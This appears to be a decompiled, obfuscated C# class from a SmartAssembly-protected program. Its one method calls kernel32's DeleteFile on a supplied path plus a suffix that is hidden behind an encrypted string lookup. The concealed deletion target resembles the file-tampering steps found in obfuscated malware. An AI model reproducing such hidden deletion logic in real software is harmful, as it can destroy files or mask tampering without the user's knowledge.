using System;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public sealed class CQyeXvaAck
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string tqeYBqOusyqAzPS);

	public bool qKRkxhexZuqHsOh(string string_0)
	{
		return DeleteFile(string_0 + getString_0(107398393));
	}

	static CQyeXvaAck()
	{
		Strings.CreateGetStringDelegate(typeof(CQyeXvaAck));
	}
}
